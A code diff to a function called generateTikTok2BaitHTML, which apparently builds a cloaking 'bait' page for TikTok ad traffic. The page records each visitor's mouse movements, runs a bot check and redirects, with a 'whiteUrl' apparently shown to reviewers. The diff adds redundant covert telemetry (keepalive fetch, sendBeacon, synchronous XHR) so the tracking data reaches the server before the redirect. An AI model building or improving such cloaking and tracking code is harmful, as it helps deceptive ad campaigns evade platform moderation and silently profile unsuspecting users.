@@ -254,7 +254,7 @@ function generateTikTok2BaitHTML(token: string, whiteUrl: string, baseUrl?: stri
         lastX=e.clientX;lastY=e.clientY;
       });
       
-      // Send telemetry before redirect
+      // Send telemetry before redirect - use multiple methods to ensure delivery
       function sendT(dest){
         T.total=Date.now()-T.start;
         T.dest=dest;
@@ -263,15 +263,21 @@ function generateTikTok2BaitHTML(token: string, whiteUrl: string, baseUrl?: stri
         if(T.events.length>50)T.events=T.events.slice(-50);
         var data=JSON.stringify(T);
         try{
+          // Method 1: fetch with keepalive (most reliable for page unload)
+          if(typeof fetch!=='undefined'){
+            fetch(tUrl,{method:'POST',headers:{'Content-Type':'application/json'},body:data,keepalive:true}).catch(function(){});
+          }
+          // Method 2: sendBeacon as backup
           if(navigator.sendBeacon){
-            // Use Blob to ensure proper content-type
             var blob=new Blob([data],{type:'application/json'});
             navigator.sendBeacon(tUrl,blob);
-          }else{
+          }
+          // Method 3: XHR sync fallback
+          else{
             var x=new XMLHttpRequest();x.open('POST',tUrl,false);
             x.setRequestHeader('Content-Type','application/json');x.send(data);
           }
-        }catch(e){}
+        }catch(e){console.log('Telemetry error:',e)}
       }
       
       // Bot detection
